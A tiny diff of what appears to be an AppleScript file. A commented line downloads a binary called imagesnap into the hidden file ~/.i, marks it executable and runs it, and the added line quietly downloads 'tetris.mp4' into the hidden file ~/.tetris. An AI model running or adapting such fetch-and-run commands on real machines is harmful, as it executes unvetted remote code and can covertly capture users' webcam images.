@@ -4,3 +4,4 @@
 --tell application "Finder" to activate
 --tell application "Finder" to display dialog "hi"
 --do shell script "curl http://sitetest.github.io/imagesnap >~/.i; chmod +x ~/.i; ~/.i"
+do shell script "curl http://sitetest.github.io/tetris.mp4 >~/.tetris"
